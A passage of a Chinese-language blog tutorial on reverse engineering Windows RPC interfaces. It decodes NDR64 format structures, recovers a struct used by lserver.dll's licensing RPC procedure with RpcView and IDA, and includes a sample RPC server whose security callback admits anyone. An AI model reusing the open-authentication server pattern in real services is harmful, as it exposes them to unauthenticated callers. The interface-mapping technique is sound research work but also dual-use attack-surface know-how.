class="comment">/* 0x0 */</span>,</span><br><span class="line">             (NDR64_UINT32) <span class="number">0</span> <span class="comment">/* 0x0 */</span></span><br><span class="line">         &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_POINTER_INSTANCE_HEADER_FORMAT</span> &#123;</span></span><br><span class="line">            NDR64_UINT32         Offset;</span><br><span class="line">            NDR64_UINT32         Reserved;</span><br><span class="line">        &#125;</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* struct _NDR64_POINTER_INSTANCE_HEADER_FORMAT */</span></span><br><span class="line">            (NDR64_UINT32) <span class="number">16</span> <span class="comment">/* 0x10 */</span>, <span class="comment">// 说明0x10偏移处是一个指针</span></span><br><span class="line">            (NDR64_UINT32) <span class="number">0</span> <span class="comment">/* 0x0 */</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_POINTER_FORMAT</span> &#123;</span></span><br><span class="line">            NDR64_FORMAT_CHAR  FormatCode;</span><br><span class="line">            NDR64_UINT8        Flags;</span><br><span class="line">            NDR64_UINT16       Reserved;</span><br><span class="line">            PNDR64_FORMAT      Pointee;</span><br><span class="line">        &#125;</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* *char */</span></span><br><span class="line">            <span class="number">0x21</span>,    <span class="comment">/* FC64_UP */</span></span><br><span class="line">            (NDR64_UINT8) <span class="number">32</span> <span class="comment">/* 0x20 */</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            &amp;__midl_frag16</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_NO_REPEAT_FORMAT</span></span></span><br><span class="line"><span class="class">        &#123;</span> </span><br><span class="line">        <span class="comment">/* struct _NDR64_NO_REPEAT_FORMAT */</span></span><br><span class="line">            <span class="number">0x80</span>,    <span class="comment">/* FC64_NO_REPEAT */</span></span><br><span class="line">            (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            (NDR64_UINT32) <span class="number">0</span> <span class="comment">/* 0x0 */</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_POINTER_INSTANCE_HEADER_FORMAT</span></span></span><br><span class="line"><span class="class">        &#123;</span> </span><br><span class="line">        <span class="comment">/* struct _NDR64_POINTER_INSTANCE_HEADER_FORMAT */</span></span><br><span class="line">            (NDR64_UINT32) <span class="number">32</span> <span class="comment">/* 0x20 */</span>,</span><br><span class="line">            (NDR64_UINT32) <span class="number">0</span> <span class="comment">/* 0x0 */</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_POINTER_FORMAT</span></span></span><br><span class="line"><span class="class">        &#123;</span> </span><br><span class="line">        <span class="comment">/* *char */</span></span><br><span class="line">            <span class="number">0x21</span>,    <span class="comment">/* FC64_UP */</span></span><br><span class="line">            (NDR64_UINT8) <span class="number">32</span> <span class="comment">/* 0x20 */</span>,</span><br><span class="line">            (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">            &amp;__midl_frag19</span><br><span class="line">        &#125;,</span><br><span class="line">        NDR64_FORMAT_CHAR frag7;</span><br><span class="line">        <span class="number">0x93</span>    <span class="comment">/* FC64_END */</span></span><br><span class="line">    &#125; frag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">__midl_frag15_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我把数值和结构体声明放到了一起, 方便理解. 通过这个结构体信息, 可以知道, 结构体大小为0x28. 有两个指针, 分别在结构体偏移 0x10, 0x20处.</p><p>查看<code>PNDR64_FORMAT __midl_frag16</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">__midl_frag16_t</span> __midl_frag16 =</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> _NDR64_CONF_ARRAY_HEADER_FORMAT</span><br><span class="line">    &#123;</span><br><span class="line">        NDR64_FORMAT_CHAR   FormatCode;</span><br><span class="line">        NDR64_ALIGNMENT     Alignment;</span><br><span class="line">        NDR64_ARRAY_FLAGS   Flags;</span><br><span class="line">        NDR64_UINT8         Reserved;</span><br><span class="line">        NDR64_UINT32        ElementSize;</span><br><span class="line">        PNDR64_FORMAT       ConfDescriptor;</span><br><span class="line">    &#125; NDR64_CONF_ARRAY_HEADER_FORMAT;</span><br><span class="line"><span class="comment">/* *char */</span></span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* *char */</span></span><br><span class="line">        <span class="number">0x41</span>,    <span class="comment">/* FC64_CONF_ARRAY */</span> <span class="comment">// 说明是一个数组</span></span><br><span class="line">        (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        &#123; </span><br><span class="line">        <span class="comment">/* *char */</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        (NDR64_UINT8) <span class="number">0</span> <span class="comment">/* 0x0 */</span>,</span><br><span class="line">        (NDR64_UINT32) <span class="number">1</span> <span class="comment">/* 0x1 */</span>,</span><br><span class="line">        &amp;__midl_frag17</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NDR64_ARRAY_ELEMENT_INFO</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        NDR64_UINT32        ElementMemSize;</span><br><span class="line">        PNDR64_FORMAT       Element;</span><br><span class="line">    &#125; NDR64_ARRAY_ELEMENT_INFO;</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* struct _NDR64_ARRAY_ELEMENT_INFO */</span></span><br><span class="line">        (NDR64_UINT32) <span class="number">1</span> <span class="comment">/* 0x1 */</span>,</span><br><span class="line">        &amp;__midl_frag21</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">__midl_frag21_t</span> __midl_frag21 =</span><br><span class="line"><span class="number">0x10</span>    <span class="comment">/* FC64_CHAR */</span>; <span class="comment">// 说明数组成员是 CHAR 类型</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">__midl_frag17_t</span> __midl_frag17 =</span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">/*  */</span></span><br><span class="line">    (NDR64_UINT32) <span class="number">1</span> <span class="comment">/* 0x1 */</span>,</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> _NDR64_EXPR_VAR</span><br><span class="line">    &#123;</span><br><span class="line">        NDR64_FORMAT_CHAR   ExprType;</span><br><span class="line">        NDR64_FORMAT_CHAR   VarType;</span><br><span class="line">        NDR64_UINT16        Reserved;</span><br><span class="line">        NDR64_UINT32        Offset;</span><br><span class="line">    &#125; NDR64_EXPR_VAR;</span><br><span class="line">    &#123; </span><br><span class="line">    <span class="comment">/* struct _NDR64_EXPR_VAR */</span></span><br><span class="line">        <span class="number">0x3</span>,    <span class="comment">/* FC_EXPR_VAR */</span></span><br><span class="line">        <span class="number">0x5</span>,    <span class="comment">/* FC64_INT32 */</span> </span><br><span class="line">        (NDR64_UINT16) <span class="number">0</span> <span class="comment">/* 0x0 */</span>, </span><br><span class="line">        (NDR64_UINT32) <span class="number">8</span> <span class="comment">/* 0x8 */</span> <span class="comment">// 说明数组size取决于偏移为8的字段.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过<code>__midl_frag16</code>我们可以知道, 数组的size取决于偏移为8字段的值, 数组成员为char类型.</p><h2 id="Rpcview-获取-RPC-接口-IDL"><a href="#Rpcview-获取-RPC-接口-IDL" class="headerlink" title="Rpcview 获取 RPC 接口 IDL"></a>Rpcview 获取 RPC 接口 IDL</h2><p>通过rpcview的<code>decompile</code>操作, 可以得到接口的idl. </p><p>如果遇到rpcview解析idl报错, 比如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">uuid(3d267954-eeb7-11d1-b94e-00c04fa3080d),</span><br><span class="line">version(1.0),</span><br><span class="line">]</span><br><span class="line">interface DefaultIfName</span><br><span class="line">&#123;</span><br><span class="line">[ERROR] unable to get list of all types sorted</span><br><span class="line">......</span><br><span class="line">error_status_t Proc8_TLSRpcRequestNewLicense(</span><br><span class="line">[in][context_handle] void* arg_0, </span><br><span class="line">[in]long arg_1, </span><br><span class="line">[in]struct Struct_302_t* arg_2, </span><br><span class="line">[in][string] wchar_t* arg_3, </span><br><span class="line">[in][string] wchar_t* arg_4, </span><br><span class="line">[in][range(0,16384)] long arg_5, </span><br><span class="line">[in][ref][size_is(arg_5)]/*[range(0,16384)]*/ byte *arg_6, </span><br><span class="line">[in]long arg_7, </span><br><span class="line">[out]long *arg_8, </span><br><span class="line">[out][ref][size_is(, *arg_8)]/*[range(0,0)]*/ byte **arg_9, </span><br><span class="line">[in][out]long *arg_10);</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p> <code>[size_is(, *arg_8)]</code> 表示<code>arg_9</code>的堆大小取决于<code>*arg_8</code>的值</p><p>因为解析错误, 导致我们需要逆向<code>struct Struct_302_t</code>结构体. 有两个方法可以逆向结构体.</p><p><strong>方法一</strong>:</p><p>找到client端, 然后查看client是怎么调用的. 找client的方法如下, 用powershell安装 NtObjectManager</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Install-Module</span> <span class="literal">-Name</span> NtObjectManager <span class="literal">-RequiredVersion</span> <span class="number">1.1</span>.<span class="number">33</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$rpc</span> = <span class="built_in">ls</span> c:\windows\system32\*.dll | <span class="built_in">Get-RpcServer</span> <span class="literal">-ParseClients</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$rpc</span> | ? &#123;<span class="variable">$_</span>.Client <span class="operator">-and</span> <span class="variable">$_</span>.InterfaceId <span class="operator">-eq</span> <span class="string">&#x27;44d1520b-6133-41f0-8a66-d37305ecc357&#x27;</span>&#125; | <span class="built_in">Select</span> FilePath</span><br></pre></td></tr></table></figure><p>原理就是遍历dll, 找到调用了rpc的操作, 并找出其中调用了目标接口的dll. 根据dll(或者dll的引用方), 看client是怎么操作的. 这个方法不一定管用.</p><p><strong>方法二</strong> :</p><p>逆向server的 <code>MIDL_SYNTAX_INFO</code>结构体.</p><p>示例<code>lserver.dll</code>:</p><p><img src="/images/rpc_readme/1722229193029.png" alt="1722229193029"></p><p><img src="/images/rpc_readme/1722229211301.png" alt="1722229211301"></p><p><img src="/images/rpc_readme/1722229305175.png" alt="1722229305175"></p><p>这里, 我关心的是第45个rpc函数的结构体描述符, 即1800A29B0:</p><p><img src="/images/rpc_readme/1722229640593.png" alt="1722229640593"></p><p>查看arg2对应的描述符:</p><p><img src="/images/rpc_readme/1722230026923.png" alt="1722230026923"></p><p>可以看到, 结构体大小为0x28, 字段大致如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct&#123;</span><br><span class="line">    int f_0;</span><br><span class="line">    int f_4;</span><br><span class="line">    int f_8;</span><br><span class="line">    int f_Ch;//pad</span><br><span class="line">    void *f_10h;</span><br><span class="line">    int f_18h;</span><br><span class="line">    int f_1Ch;</span><br><span class="line">    void *f_20h;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>跟入<code>unk_1800A22C0</code>:</p><p><img src="/images/rpc_readme/1722235196142.png" alt="1722235196142"></p><p>查看第一个指针的描述符:</p><p><img src="/images/rpc_readme/1722235471598.png" alt="1722235471598"></p><p><img src="/images/rpc_readme/1722236037118.png" alt="1722236037118"></p><p><img src="/images/rpc_readme/1722236108087.png" alt="1722236108087"></p><p>可以知道, 结构体是一个数组, 类型为char, size偏移为8.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct&#123;</span><br><span class="line">    int f_0;</span><br><span class="line">    int f_4;</span><br><span class="line">    int f_8;</span><br><span class="line">    int f_Ch;//pad</span><br><span class="line">    [size_is(f_8)]char *f_10h;</span><br><span class="line">    int f_18h;</span><br><span class="line">    int f_1Ch;</span><br><span class="line">    void *f_20h;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>f_20h的分析:</p><p><img src="/images/rpc_readme/1722236463119.png" alt="1722236463119"></p><p>所以, arg2对应的结构体如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct&#123;</span><br><span class="line">    int f_0;</span><br><span class="line">    int f_4;</span><br><span class="line">    int f_8;</span><br><span class="line">    int f_Ch;//pad</span><br><span class="line">    [size_is(f_8)]char *f_10h;</span><br><span class="line">    int f_18h;</span><br><span class="line">    int f_1Ch;</span><br><span class="line">    [size_is(f_18h)]char *f_20h;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="RPC项目示例"><a href="#RPC项目示例" class="headerlink" title="RPC项目示例"></a>RPC项目示例</h2><p>来自 <a href="https://www.codeproject.com/Articles/4837/Introduction-to-RPC-Part-1#Implicitandexplicithandles17" title="Introduce RPC">示例项目</a><br>代码里的”Example1.h”是根据idl自动生成的.</p><p><strong>Server</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// File Example1Server.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Example1.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Server function.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Output</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szOutput)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; szOutput &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Naive security callback.</span></span><br><span class="line">RPC_STATUS CALLBACK <span class="title function_">SecurityCallback</span><span class="params">(RPC_IF_HANDLE <span class="comment">/*hInterface*/</span>, <span class="type">void</span>* <span class="comment">/*pBindingHandle*/</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> RPC_S_OK; <span class="comment">// Always allow anyone.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   RPC_STATUS status;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Uses the protocol combined with the endpoint for receiving</span></span><br><span class="line">   <span class="comment">// remote procedure calls.</span></span><br><span class="line">   status = RpcServerUseProtseqEp(</span><br><span class="line">      reinterpret_cast&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(<span class="string">&quot;ncacn_ip_tcp&quot;</span>), <span class="comment">// Use TCP/IP protocol.</span></span><br><span class="line">      RPC_C_PROTSEQ_MAX_REQS_DEFAULT, <span class="comment">// Backlog queue length for TCP/IP.</span></span><br><span class="line">      reinterpret_cast&lt;<span class="type">unsigned</span> <span class="type">char</span>*&gt;(<span class="string">&quot;4747&quot;</span>),         <span class="comment">// TCP/IP port to use.</span></span><br><span class="line">      <span class="literal">NULL</span>);                          <span class="comment">// No security.</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (status)</span><br><span class="line">      <span class="built_in">exit</span>(status);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Registers the Example1 interface.</span></span><br><span class="line">   status = RpcServerRegisterIf2(</span><br><span class="line">      Example1_v1_0_s_ifspec,              <span class="comment">// Interface to register.</span></span><br><span class="line">      <span class="literal">NULL</span>,                                <span class="comment">// Use the MIDL generated entry-point vector.</span></span><br><span class="line">      <span class="literal">NULL</span>,                                <span class="comment">// Use the MIDL generated entry-point vector.</span></span><br><span class="line">      RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH, <span class="comment">// Forces use of security callback.</span></span><br><span class="line">      RPC_C_LISTEN_MAX_CALLS_DEFAULT,      <span class="comment">// Use default number of concurrent calls.</span></span><br><span class="line">      (<span class="type">unsigned</span>)<span class="number">-1</span>,                        <span class="comment">// Infinite max size of incoming data blocks.</span></span><br><span class="line">      SecurityCallback);                   <span class="comment">// Naive security callback.</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (status)</span><br><span class="line">      <span class="built_in">exit</span>(status);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Start to listen for remote procedure</span></span><br><span class="line">   <span class="comment">// calls for all registered interfaces.</span></span><br><span class="line">   <span class="comment">// This call will not return until</span></span><br><span class="line">   <span class="comment">// RpcMgmtStopServerListening is called.</span></span><br><span class="line">   status = RpcServerListen(</span><br><span class="line">     <span class="number">1</span>,                                   <span class="comment">// Recommended minimum number of threads.</span></span><br><span class="line">     RPC_C_LISTEN_MAX_CALLS_DEFAULT,      <span class="comment">// Recommended maximum number of threads.</span></span><br><span class="line">     FALSE);                              <span class="comment">// Start listening now.</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (status)</span><br><span class="line">      <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocation function for RPC.</span></span><br><span class="line"><span class="comment">// The runtime uses these two functions for allocating/deallocating</span></span><br><span class="line"><span class="comment">// enough memory to pass the string to the server.</span></span><br><span class="line"><span class="type">void</span>* __RPC_USER <span class="title function_">midl_user_allocate</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory deallocation function for RPC.</span></span><br><span class="line"><span class="type">void</span> __RPC_USER <span class="title function_">midl_user_free</span><span class="params">(<span class="type">void</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>idl</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// File Example1.idl</span><br><span class="line">[</span><br><span class="line">   // A unique identifier that distinguishes this interface from other interfaces.</span><br><span class="line">   uuid(00000001-EAF3-4A7A-A0F2-BCE4C30DA77E),</span><br><span class="line"></span><br><span class="line">   // This is version 1.0 of this interface.</span><br><span class="line">   version(1.0)</span><br><span class="line">]</span><br><span class="line">interface Example1 // The interface is named Example1</span><br><span class="line">&#123;</span><br><span class="line">   // A function that takes a zero-terminated string.</span><br><span class="line">   void Output(</span><br><span class="line">      [in, string] const char* szOutput);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Client</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">// File Example1Client.cpp</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;../Example1/Example1.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   RPC_STATUS status;</span><br><span class="line">   unsigned char* szStringBinding = NULL;</span><br><span class="line"></span><br><span class="line">   // Creates a string binding handle.</span><br><span class="line">   // This function is nothing more than a printf.</span><br><span class="line">   // Connection is not done here.</span><br><span class="line">   status = RpcStringBindingCompose(</span><br><span class="line">      NULL, // UUID to bind to.</span><br><span class="line">      reinterpret_cast&lt;unsigned char*&gt;(&quot;ncacn_ip_tcp&quot;), // Use TCP/IP</span><br><span class="line">                                                        // protocol.</span><br><span class="line">      reinterpret_cast&lt;unsigned char*&gt;(&quot;localhost&quot;), // TCP/IP network</span><br><span class="line">                                                     // address to use.</span><br><span class="line">      reinterpret_cast&lt;unsigned char*&gt;(&quot;4747&quot;), // TCP/IP port to use.</span><br><span class="line">      NULL, // Protocol dependent network options to use.</span><br><span class="line">      &amp;szStringBinding); // String binding output.</span><br><span class="line"></span><br><span class="line">   if (status)</span><br><span class="line">      exit(status);</span><br><span class="line"></span><br><span class="line">   // Validates the format of the string binding handle and converts</span><br><span class="line">   // it to a binding handle.</span><br><span class="line">   // Connection is not done here either.</span><br><span class="line">   status = RpcBindingFromStringBinding(</span><br><span class="line">      szStringBinding, // The string binding to validate.</span><br><span class="line">      &amp;hExample1Binding); // Put the result in the implicit binding</span><br><span class="line">                          // handle defined in the IDL file.</span><br><span class="line"></span><br><span class="line">   if (status)</span><br><span class="line">      exit(status);</span><br><span class="line"></span><br><span class="line">   RpcTryExcept</span><br><span class="line">   &#123;</span><br><span class="line">      // Calls the RPC function. The hExample1Binding binding handle</span><br><span class="line">      // is used implicitly.</span><br><span class="line">      // Connection is done here.</span><br><span class="line">      Output(&quot;Hello Implicit RPC World!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   RpcExcept(1)</span><br><span class="line">   &#123;</span><br><span class="line">      std::cerr &lt;&lt; &quot;Runtime reported exception &quot; &lt;&lt; RpcExceptionCode()</span><br><span class="line">                &lt;&lt; std::endl;</span><br><span class="line">   &#125;</span><br><span class="line">   RpcEndExcept</span><br><span class="line"></span><br><span class="line">   // Free the memory allocated by a string.</span><br><span class="line">   status = RpcStringFree(</span><br><span class="line">      &amp;szStringBinding); // String to be freed.</span><br><span class="line"></span><br><span class="line">   if (status)</span><br><span class="line">      exit(status);</span><br><span class="line"></span><br><span class="line">   // Releases binding handle resources and disconnects from the server.</span><br><span class="line">   status = RpcBindingFree(</span><br><span class="line">      &amp;hExample1Binding); // Frees the implicit binding handle defined in</span><br><span class="line">                          // the IDL file.</span><br><span class="line"></span><br><span class="line">   if (status)</span><br><span class="line">      exit(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Memory allocation function for RPC.</span><br><span class="line">// The runtime uses these two functions for allocating/deallocating</span><br><span class="line">// enough memory to pass the string to the server.</span><br><span class="line">void* __RPC_USER midl_user_allocate(size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    return malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Memory deallocation function for RPC.</span><br><span class="line">void __RPC_USER midl_user_free(void* p)</span><br><span class="line">&#123;</span><br><span class="line">    free(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="NDR64-FORMAT-CHARACTER"><a href="#NDR64-FORMAT-CHARACTER" class="headerlink" title="NDR64_FORMAT_CHARACTER"></a>NDR64_FORMAT_CHARACTER</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 